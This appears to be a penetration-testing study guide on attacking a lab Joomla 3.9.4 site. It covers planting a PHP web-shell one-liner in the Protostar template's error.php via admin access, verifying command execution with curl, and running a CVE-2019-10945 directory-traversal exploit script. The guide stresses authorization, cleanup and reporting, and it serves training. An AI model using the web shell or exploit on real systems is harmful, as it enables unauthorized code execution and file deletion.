![Image](https://images.openai.com/static-rsc-4/lpKDTffnYfCq31GK01-3U6-fUi6IdZzIGQOsC8JZC1fJ2oKLcuppgz-2CumFJXCiQXs-wTXe5bAhHJVfoLiRpVwZL59jhr6rny8a-0EK6IlXB-kH7ik5z9fAO7dYvmO2-72dwxKLPYhANAbJmGkIx8fGabG6l-aFWtoDFl6eS9jxiPthw32Nu5fE53rsr7OI?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/8Xmuo187MC8mcPZjq-eIaTuxasryrTQTOnyjSg-iXQGaCmfb4xmGWIupomkBdPch3vynoUkxxG4WHbHl022GkgY_Xm8__0B2JQwcTsWeNaDG0SVvFJiLQFB_2qtoPGHqgf3eQVfEhptg2y3nVT7ZsQQrxMfQOAkTz-ZYAqN_6hDCIpjmSTDQJpE5DGICeXKt?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/nrzBU8oYgeIEVkq6p9uXU8JoVMw8L978sUq2CosZTNgZj5zniLPqjd-FsQ_yV9ehHvb0TJgOND2odf9rWG4htBZR3Tml5TFsWa3S6u_eBhYhZpvxaJigp4I4H6Ax0ToE9hp3-cpJ3Nr9HniNeBwROGuITE1dxy3F9lxMSs9tU_fADyfu9cQIXd9gjsyULm9L?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/dfRYZ4pSVAZvyz5Yj9JKWfzYvgURU59IJY2trhIWkbyOQFZi5Z-ipqg3jgg85RnzPMSzMRd8nsjxUnm4NMoKrOuY94j56uUNL-MdXyTDF6ZwspJYvwRP_tcRjcYwFqy9oa02rsj5TIdA3tr3LJaXn-kAEuzcB9P467thez7FbQ1cAPoVPtBo8Zu0w5Wv7bsE?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/_cnorjjrKC9Bef92L1gHygZBqpgfVJ6Xqxv608D8orTOTHgXwSu1A_-RV709McYz_qWxKzC5wq1YDoIj4lckgUXxShbndIHodNwWTh0IV10_xtAm7q7LPohe2g5cgLDxmfXsMOWKQND21L5al0_f9XB0Vcvja6W1u2uoqBcR7-Dos7cgiYvVaWJj5NHIIdfp?purpose=fullsize)

---

# 1. Attacking Joomla — Overview

We already established that the target is a **Joomla e-commerce site**.

The objective after gaining access is potentially to:

```text
Joomla Web Application
        ↓
Initial Access
        ↓
Remote Code Execution
        ↓
www-data
        ↓
Local Enumeration
        ↓
Privilege Escalation
        ↓
Internal Network Enumeration
        ↓
Lateral Movement
```

Like WordPress and Drupal, Joomla has vulnerabilities in both:

- The **core application**
    
- Vulnerable **extensions**
    

Additionally, if we obtain administrative access, Joomla's built-in functionality can potentially be abused to achieve **Remote Code Execution (RCE)**.

---

# 2. Two Main Attack Paths

This section covers two major approaches:

```text
                    Joomla
                       │
             ┌─────────┴──────────┐
             │                    │
             ▼                    ▼
     Built-In Functionality   Known Vulnerability
             │                    │
             ▼                    ▼
       Admin Access          CVE-2019-10945
             │                    │
             ▼                    ▼
       Template Editing      Directory Traversal
             │               + File Deletion
             ▼
             RCE
```

### Path 1 — Abusing Built-In Functionality

Requires:

```text
Valid administrator credentials
```

Then:

```text
Administrator
     ↓
Templates
     ↓
Customize template
     ↓
Edit PHP
     ↓
Insert command execution
     ↓
RCE
```

### Path 2 — Known Vulnerability

The source focuses on:

```text
Joomla 3.9.4
       ↓
CVE-2019-10945
       ↓
Directory Traversal
       +
Authenticated Arbitrary File Deletion
```

---

# 🔐 3. Abusing Built-In Functionality

During Joomla enumeration and general OSINT/research, we may discover **leaked credentials**.

From the previous section, we obtained:

```text
admin:admin
```

These credentials can be used to access:

```text
http://dev.inlanefreight.local/administrator
```

Once authenticated, the Joomla administrative control panel becomes available.

---

# 🖥️ 4. Joomla Administrator Control Panel

![Image](https://images.openai.com/static-rsc-4/dfRYZ4pSVAZvyz5Yj9JKWfzYvgURU59IJY2trhIWkbyOQFZi5Z-ipqg3jgg85RnzPMSzMRd8nsjxUnm4NMoKrOuY94j56uUNL-MdXyTDF6ZwspJYvwRP_tcRjcYwFqy9oa02rsj5TIdA3tr3LJaXn-kAEuzcB9P467thez7FbQ1cAPoVPtBo8Zu0w5Wv7bsE?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/oeOYGhU7ZdAzMoJr3eSp5T6Uqbd2g59CjYCs3GuKIP0h546goMZuHqeaJoc9YIs9IVPQj-X_ovvz-tcbqIQ66l7LAw6RdAANp8MtlTSb3roX8kl3EAejLZGqZoDfy7FDWeDReFYmRFqKF1vo3J4ThAwy2l7vyDVulg0L6WKt_-vAVhKABKSVtn3n3o8SZHw8?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/D6gAZLLjeDgJFFYkaUdsfd6YA5kTDysiMqK4VFYByFjfVOLRx7Mxs3cR0eyp1j3mM35qyBdblSi_DR8uDwhf9mL6aSv9dzgQ-24UTx1s3puhzgKun6Au3-d5HYVMx3DhfMlYpkLZSH0FmFxk1xw3jfPv2uZ43vYCnejtjZpnD-ww_otXhfFE-uXUoQTPjoiB?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/lpKDTffnYfCq31GK01-3U6-fUi6IdZzIGQOsC8JZC1fJ2oKLcuppgz-2CumFJXCiQXs-wTXe5bAhHJVfoLiRpVwZL59jhr6rny8a-0EK6IlXB-kH7ik5z9fAO7dYvmO2-72dwxKLPYhANAbJmGkIx8fGabG6l-aFWtoDFl6eS9jxiPthw32Nu5fE53rsr7OI?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/4YAb_fS_YikPhj3NkOLxjrhCw_ZGW6cboviY6iSnpZfF8ASHtrFDp55PoxPRszRaNJjOPZ4p9tiYClZivWZ9TsciOAihRh89vNa_Z4X5FdL3JUFqGQhHMsNwDLK4Y9qaPARE7oNR3AatyHdA7DEXHTF-aQIeRFNI2zvEViupGuj_jzCrS94n7RT3dRIbIcQO?purpose=fullsize)

The administrator panel exposes many functions.

For this attack, we are particularly interested in:

```text
Configuration
     ↓
Templates
     ↓
Template customization
     ↓
PHP source files
```

### ⚠️ Important

This is an example of **legitimate administrative functionality becoming an attack primitive** after an attacker obtains administrator credentials.

The vulnerability isn't necessarily in the template editor itself.

Instead:

```text
Valid Admin Credentials
        +
Powerful Administrative Functionality
        ↓
Ability to Modify Server-Side PHP
        ↓
RCE
```

---

# ⚠️ 5. Joomla Control Panel Error

The source provides an important troubleshooting note.

If, after logging in, you receive:

```text
An error has occurred.
Call to a member function format() on null
```

navigate to:

```text
http://dev.inlanefreight.local/administrator/index.php?option=com_plugins
```

and disable:

```text
Quick Icon - PHP Version Check
```

This allows the control panel to display properly.

### ⭐ CPTS note

When working through a lab or assessment:

> **Don't mistake an application/plugin error for a failed authentication attempt.**

Separate:

```text
Authentication failure
```

from:

```text
Post-authentication application error
```

---

# 🎨 6. Opening the Templates Menu

From the Joomla administrator dashboard:

```text
Configuration
     ↓
Templates
```

The source uses:

```text
http://dev.inlanefreight.local/administrator/index.php?option=com_templates
```

The Templates page shows available templates, including:

```text
Beez3
Protostar
```

---

# 🧩 7. Selecting a Template

Under the **Template** column, select:

```text
protostar
```

This opens:

```text
Templates: Customise
```

The source gives:

```text
http://dev.inlanefreight.local/administrator/index.php?option=com_templates&view=template&id=506
```

---

# 💻 8. Template Customization

![Image](https://images.openai.com/static-rsc-4/GNQYy4cgwysK-SdCypZaMlx_qHiMDMXAxmB9cNUXyC3T4BBPS6Dnjno2ljY3xl5Mj0t9l1nadBe5704fphRaObvtpn1Z-NItOYtMARAb7hnAxromma_5glwOWQXwct_ZA7TUPyLKjZYLLZItp1QrcddXUXNDF5uhUcTMThcv2EouphUs9nWj2808WzbMUgM-?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/8Xmuo187MC8mcPZjq-eIaTuxasryrTQTOnyjSg-iXQGaCmfb4xmGWIupomkBdPch3vynoUkxxG4WHbHl022GkgY_Xm8__0B2JQwcTsWeNaDG0SVvFJiLQFB_2qtoPGHqgf3eQVfEhptg2y3nVT7ZsQQrxMfQOAkTz-ZYAqN_6hDCIpjmSTDQJpE5DGICeXKt?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/dedN8L85nTnWihyV6CoWS3yJ-DFI52uCmMkerCfumxadkaRD1IzfCnFsVd9h0bU7yS2IisSw0Wx1fHPiS4UdRzk5Jn_YL5RwncOrDlsaEjH-RrsPWtBW7Eew4fP27M-ektUBu8n3OISrrDON7RoCe0eARqMLq1eq1-65kW9pZjDV_Jg5KW240ismyofNq5-s?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/ty8t2jPin1TTyh6cEe9iS4mwklO0rP3XnX0G9XkRcRTzKNe-p9AVvczDZn_SQdbCF9u0K29ggcHrM6uP2zove7kGnSojSVdpaMOAGi4UE8mhi034UeBf7vdAG7LN8FQAsiCKGSUtTaWWHKvjzEhAasVD5MelMxziYJQ7C4xtXDQAus27KUIeAP_RT_MaukWR?purpose=fullsize)

The template customization interface allows administrators to select individual template files.

This is extremely important from a penetration-testing perspective.

Why?

Because:

```text
Template File
      ↓
PHP Code
      ↓
Executed by Web Server
```

Therefore, if an attacker can modify an executable PHP template file:

```text
Admin Access
     ↓
Modify PHP
     ↓
Save
     ↓
Request PHP file
     ↓
Server executes code
```

---

# 🐚 9. Web Shell Safety During Assessments

The source provides an important professional pentesting recommendation.

When creating a web shell, avoid predictable:

```text
File names
Parameter names
```

The purpose is to reduce the possibility of a **drive-by attacker** discovering the shell during the assessment.

The source recommends:

- Using non-standard filenames
    
- Using non-standard parameters
    
- Password protecting the shell
    
- Limiting access to the tester's source IP address
    
- Cleaning up the shell immediately after use
    

### ⭐ Important

The final report should **still document the artifact** even after cleanup.

Record:

```text
Filename
File hash
Location
```

This is important for reproducibility and client reporting.

---

# 🔥 10. Modifying `error.php`

The source chooses:

```text
error.php
```

inside the Protostar template.

A PHP one-liner is inserted:

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

### Understand the code

The parameter is:

```text
dcfdd5e021a869fcc6dfaef8bf31377e
```

The code retrieves it through:

```php
$_GET['dcfdd5e021a869fcc6dfaef8bf31377e']
```

and passes it to:

```php
system()
```

Conceptually:

```text
HTTP GET parameter
        ↓
$_GET[...]
        ↓
system()
        ↓
Operating-system command
```

---

# 🧠 11. Why the Random Parameter Matters

Instead of using an obvious parameter such as:

```text
?cmd=
```

the source uses:

```text
?dcfdd5e021a869fcc6dfaef8bf31377e=
```

This makes accidental discovery less likely.

### Pentesting principle

When creating temporary testing infrastructure:

```text
Predictable artifact
      ↓
Easy discovery

Randomized artifact
      ↓
Lower accidental exposure
```

This is **not a security mechanism by itself**; it is simply an assessment hygiene measure.

---

# 💾 12. Save the Modified File

After inserting the PHP line:

```text
Save & Close
```

must be selected.

The modified file is:

```text
error.php
```

within:

```text
/templates/protostar/
```

---

# 🧪 13. Confirming Code Execution

The source verifies execution with:

```bash
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

The result:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This proves:

```text
PHP code
   ↓
Executed successfully
   ↓
Operating-system command
   ↓
id
   ↓
www-data
```

---

# 👤 14. Understanding `www-data`

The result:

```text
uid=33(www-data)
gid=33(www-data)
groups=33(www-data)
```

means the command is executing as:

```text
www-data
```

This is the web-server account shown by the lab.

### Important distinction

Obtaining RCE does **not automatically mean root**.

We currently have:

```text
RCE
 ↓
www-data
```

not:

```text
RCE
 ↓
root
```

Therefore the next phase would normally be:

```text
Local Enumeration
       ↓
Privilege Escalation
```

or potentially:

```text
Internal Network Enumeration
       ↓
Lateral Movement
```

---

# 🐚 15. From Command Execution to Interactive Shell

The source states that from this point we can upgrade to an:

```text
Interactive reverse shell
```

and then focus on:

### Option A — Privilege Escalation

```text
www-data
   ↓
Local enumeration
   ↓
Find privilege escalation vector
   ↓
Higher privileges
```

### Option B — Lateral Movement

```text
www-data
   ↓
Enumerate host/network
   ↓
Discover internal systems
   ↓
Credentials / trust relationships
   ↓
Lateral movement
```

---

# 🧹 16. Cleanup

Once testing is complete:

```text
Remove PHP snippet
```

from:

```text
error.php
```

The modification must also be documented.

### Report:

```text
Modified file → error.php
Location       → /templates/protostar/
Purpose        → RCE validation
Cleanup        → PHP snippet removed
```

---

# 🛡️ 17. Known Vulnerabilities

The second major approach is exploiting known Joomla vulnerabilities.

The source states that, at the time of writing:

```text
426
```

Joomla-related vulnerabilities had received CVEs.

However:

> **A CVE does not automatically mean that the vulnerability is exploitable.**

This is a very important penetration-testing principle.

---

# 🧠 18. CVE ≠ Exploit

Think of the process as:

```text
CVE Discovered
      ↓
Affected Version?
      ↓
Vulnerable Configuration?
      ↓
Public PoC?
      ↓
Reliable Exploit?
      ↓
Target Actually Vulnerable?
      ↓
Safe Validation
```

Therefore:

```text
CVE exists
```

does **not** automatically mean:

```text
Target can be compromised
```

---

# 📊 19. Joomla Core vs Extensions

The source states that critical Joomla **core** vulnerabilities, particularly RCE vulnerabilities, are relatively rare.

Searching Exploit-DB showed:

```text
1,400+
```

Joomla-related entries at the time of writing.

The majority were associated with:

```text
Joomla extensions
```

rather than the Joomla core.

### ⭐ Key takeaway

```text
Joomla
  │
  ├── Core
  │     └── Critical RCE → comparatively rare
  │
  └── Extensions
        └── Large vulnerability surface
```

So during an assessment:

> **Don't stop after identifying the Joomla core version. Enumerate extensions.**

---

# 🎯 20. Target Version — Joomla 3.9.4

From the previous enumeration phase, the target was identified as:

```text
Joomla 3.9.4
```

Target:

```text
http://dev.inlanefreight.local/
```

The source states that Joomla 3.9.4 was released in:

```text
March 2019
```

At the time of writing, Joomla had progressed to:

```text
4.0.3
```

as of September 2021.

### Important pentesting lesson

Old software can still exist in enterprise environments.

Possible reasons include:

```text
Poor application inventory
        ↓
Unknown legacy applications
        ↓
No patching
        ↓
Old versions remain online
```

Therefore:

> **Never assume an old version is irrelevant simply because it is no longer current.**

---

# 🐛 21. CVE-2019-10945

The source identifies:

```text
CVE-2019-10945
```

as a vulnerability likely affecting Joomla 3.9.4.

The vulnerability is described as:

```text
Directory Traversal
+
Authenticated Arbitrary File Deletion
```

Affected versions according to the exploit output:

```text
Joomla 1.5.0 through Joomla 3.9.4
```

---

# 🧩 22. What Is Directory Traversal?

Directory traversal occurs when an application allows a user to manipulate a file path and move outside the intended directory.

Conceptually:

```text
Intended directory
      ↓
/var/www/app/files/
      ↓
Attacker-controlled path
      ↓
Parent-directory traversal
      ↓
/etc/
      ↓
Sensitive locations
```

The exact impact depends on:

- Application functionality
    
- Permissions
    
- Path handling
    
- Authentication requirements
    

---

# 🗑️ 23. Authenticated Arbitrary File Deletion

The second component of CVE-2019-10945 is:

```text
Authenticated Arbitrary File Deletion
```

This means an authenticated user can potentially cause files outside their intended scope to be deleted.

Potential impact:

```text
Delete configuration
       ↓
Application malfunction

Delete credentials/scripts
       ↓
Potential information exposure or attack-path changes

Delete important application files
       ↓
Denial of service / damage
```

The source specifically warns that deletion can cause damage when the web-server user has appropriate permissions.

---

# 🔐 24. Why Authentication Matters

This vulnerability is:

```text
Authenticated
```

So credentials are required.

The source's credentials are:

```text
admin:admin
```

Therefore:

```text
Valid Credentials
       +
Vulnerable Joomla 3.9.4
       ↓
Potential CVE-2019-10945 exploitation
```

---

# 🛠️ 25. Exploit Resources

The source references:

```text
Exploit-DB
```

with exploit:

```text
46710
```

and a Python 3 version hosted on GitHub.

The exploit can be used to:

```text
List directory contents
```

and potentially:

```text
Delete files
```

The source explicitly states that deleting files is:

> **not recommended**

during the assessment unless required for controlled validation.

---

# 🔎 26. Directory Listing Through the Vulnerability

The example runs:

```bash
python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```

### Parameter breakdown

|Parameter|Purpose|
|---|---|
|`--url`|Joomla administrator URL|
|`--username`|Authenticated Joomla username|
|`--password`|Password|
|`--dir`|Directory to enumerate|

In this case:

```text
--dir /
```

requests enumeration beginning from the filesystem root/application context targeted by the exploit.

---

# 📂 27. Exploit Output

The script identifies directories such as:

```text
administrator
bin
cache
cli
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
```

It also finds files:

```text
LICENSE.txt
README.txt
configuration.php
htaccess.txt
index.php
robots.txt
web.config.txt
```

![Image](https://images.openai.com/static-rsc-4/2i2Wd7dd42-Wc4KPORyT4-7DsgaSVn4SbEVIRUBjO0kx-4NjSezwINH_nqh5Xz4JiWMvAqi-nbWBqHcxWkT4NraN4ITd4ORBD84FiWPLuiumM3tv6oxS6-XWpfAPOrBqlkDFhSUdzKg2Ev8J_QeJfEx0O3Lk3G6dZ8XebRGV1J4H8mT81lgw9T_Adteaj-y_?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/CfDmKA5zfewkqdcZrOnlbeg1B0rYZFemHwNX7PXm49AahdindV8vp9EiLix_thA8cEiEY-LZlgKB-lCbWVOnSWDOhmnMbwFJVQ1QmzY9de4XRo2yupjDR4oCb2LlduRO--3qEDwur9785l_y9uWXvx8x3yc4qOFelKI7pvtutpbTxLWPvXGX3dfmdBNaSb1R?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/0yiIzRBM61dvnxkU41V9iKmWT6pGAuYYeiU3hElb1qqID8JEUZvmCrUwzPj91kxhHL_ydUzws03aw8kzat7fprQrMOycg7D39Wx317qsWFtiNpFy1PtGXg9CGF33jR9VBrWXzK7JTQpE8vgi0Hf8HBJ7OMk0OjQ8n60_BoQ70pKTLvwbvkZMVmh0huepIiqp?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/U5Z0502znnjO76ncHFg4wq39CeY1fGAROxpO3CnlHuFkq9VhlI6pRJNBLM6mbGzqRGbjCOLCJN6ahjJn2rYC-RLlN74ib_T4qIhCKotMVNwg-73ZPExpD0iPKUkanOl-GEjPkwPCuI-gOwvDFkmOgIlcECqvsNoF1zrSkmDy-43aE0NjuTu8luXh-0i97XzR?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/kmbM6hLdofyH-xpvM1vhDJclyv63YwriW3CgrEc7xgAaYqciE-T2LdbOU6Esx2ZWki2vB-aGdudiIlHcujD0BKiFJZaXqlsGpwPG9SSm1b_i5ZLP32MCjTL4isyNHFAO_XorSxFEpC3XKiMRCjIlXak6RY7GadJuN4AKkQn0N-NJXYLhoJ02W7Cv5FkT4-8W?purpose=fullsize)

---

# 🚨 28. Why `configuration.php` Is Important

Among the discovered files:

```text
configuration.php
```

is particularly interesting.

Joomla's configuration file can contain sensitive application configuration.

Therefore, the discovery of:

```text
configuration.php
```

is important from an assessment perspective.

The source specifically notes that vulnerabilities such as this could potentially provide access to **sensitive files such as configuration files or scripts holding credentials**, particularly if those files can subsequently be accessed through the application URL.

---

# ⚠️ 29. Do Not Confuse Listing With Reading

An important distinction:

```text
Directory traversal
       ↓
Can identify files
```

does not necessarily mean:

```text
Can read every file
```

Likewise:

```text
Can delete file
```

does not mean:

```text
Can execute file
```

Always validate the actual impact.

---

# 🔥 30. Complete CVE Attack Chain

```text
Joomla 3.9.4
      ↓
Research Version
      ↓
CVE-2019-10945
      ↓
Directory Traversal
      +
Authenticated File Deletion
      ↓
Authenticated Request
      ↓
Enumerate Directory Contents
      ↓
Identify Sensitive Files
      ↓
Potential Impact
```

The source's demonstrated result is directory enumeration.

---

# 🧠 31. Built-In Functionality vs CVE

|Characteristic|Built-In Functionality|CVE-2019-10945|
|---|---|---|
|Initial requirement|Admin credentials|Admin credentials|
|Main weakness|Excessive admin capability|Vulnerable Joomla core|
|Version-specific?|Not necessarily|Yes|
|Technique|Template modification|Directory traversal|
|Main impact shown|RCE|Directory enumeration / file deletion|
|Authentication|Required|Required|
|Cleanup|Remove PHP snippet|Avoid destructive deletion|

---

# 🗺️ 32. Complete Joomla Attack Methodology

```text
                    JOOMLA TARGET
                         │
                         ▼
                 ENUMERATION
                         │
             ┌───────────┴───────────┐
             ▼                       ▼
        Credentials             Version
             │                       │
             ▼                       ▼
        admin:admin               3.9.4
             │                       │
             ▼                       ▼
     Administrator Login       CVE Research
             │                       │
             ▼                       ▼
         Templates             CVE-2019-10945
             │                       │
             ▼                       ▼
       Protostar             Directory Traversal
             │                       │
             ▼                       ▼
         error.php           File Enumeration
             │                       │
             ▼                       ▼
      PHP Code Execution      Potential File Deletion
             │
             ▼
          www-data
             │
        ┌────┴─────┐
        ▼          ▼
 Privilege       Lateral
 Escalation      Movement
```

---

# ⭐ 33. Important Commands — Quick Reference

### Access administrator panel

```text
http://dev.inlanefreight.local/administrator
```

### Plugins troubleshooting page

```text
http://dev.inlanefreight.local/administrator/index.php?option=com_plugins
```

### Templates page

```text
http://dev.inlanefreight.local/administrator/index.php?option=com_templates
```

### Template customization

```text
http://dev.inlanefreight.local/administrator/index.php?option=com_templates&view=template&id=506
```

### Test PHP command execution

```bash
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

Expected source output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### CVE exploit example

```bash
python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```

---

# 🧠 34. Things You Should Memorize

## ⭐ Joomla Admin

```text
/administrator/
```

---

## ⭐ Admin credentials from the lab

```text
admin:admin
```

---

## ⭐ Target version

```text
Joomla 3.9.4
```

---

## ⭐ RCE technique

```text
Administrator
    ↓
Templates
    ↓
Protostar
    ↓
error.php
    ↓
PHP one-liner
    ↓
www-data
```

---

## ⭐ PHP one-liner from the source

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

---

## ⭐ RCE validation

```bash
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

---

## ⭐ CVE

```text
CVE-2019-10945
```

---

## ⭐ CVE impact

```text
Directory Traversal
+
Authenticated Arbitrary File Deletion
```

---

## ⭐ Important sensitive file

```text
configuration.php
```

---

# 🚨 35. Professional Pentesting Notes

The source repeatedly emphasizes operational discipline.

### Before exploitation

```text
Confirm authorization
        ↓
Understand target
        ↓
Confirm vulnerability
        ↓
Use controlled payload
```

### During exploitation

```text
Minimize changes
        ↓
Use identifiable artifacts
        ↓
Avoid unnecessary destructive actions
        ↓
Document every modification
```

### After exploitation

```text
Remove shell
        ↓
Restore modified files
        ↓
Remove temporary artifacts
        ↓
Record filename/hash/location
        ↓
Document findings
```

This is especially important because the goal of a professional penetration test is to **demonstrate risk without unnecessarily damaging the client's environment**.

---

# 📝 36. Reporting Checklist

For the built-in RCE attack, record:

```text
[ ] Target URL
[ ] Joomla version
[ ] Account used
[ ] Template modified
[ ] File modified
[ ] PHP snippet inserted
[ ] Parameter name
[ ] Time of modification
[ ] Command used for validation
[ ] Resulting user
[ ] File hash
[ ] Cleanup performed
```

For CVE-2019-10945:

```text
[ ] Target version
[ ] CVE
[ ] Authentication used
[ ] Exploit version/source
[ ] Directory tested
[ ] Files discovered
[ ] Sensitive files identified
[ ] Any deletion performed
[ ] Cleanup
[ ] Impact
```

---

# 🏆 37. Final CPTS Takeaway

The biggest lesson here is:

> **Once you obtain Joomla administrator access, don't immediately assume you need a complicated exploit. First look at what the application's legitimate administrative functionality already allows you to modify.**

The attack path is:

```text
Credential Discovery
       ↓
admin:admin
       ↓
Joomla Administrator
       ↓
Templates
       ↓
Protostar
       ↓
error.php
       ↓
PHP modification
       ↓
Remote Code Execution
       ↓
www-data
```

If administrator access isn't usable, investigate the **specific Joomla version and extensions**:

```text
Joomla 3.9.4
       ↓
CVE Research
       ↓
CVE-2019-10945
       ↓
Authenticated Directory Traversal
       +
Arbitrary File Deletion
```

And remember the core pentesting principle:

```text
CVE EXISTS
    ≠
TARGET IS EXPLOITABLE
```

You must establish:

```text
Affected Version
      +
Affected Component
      +
Required Conditions
      +
Working Exploit/PoC
      +
Target Configuration
      ↓
Actual Exploitability
```

Finally, **cleanup and reporting are part of exploitation**—not something to think about afterward. The source specifically requires documenting modified files, hashes, locations, and cleanup actions.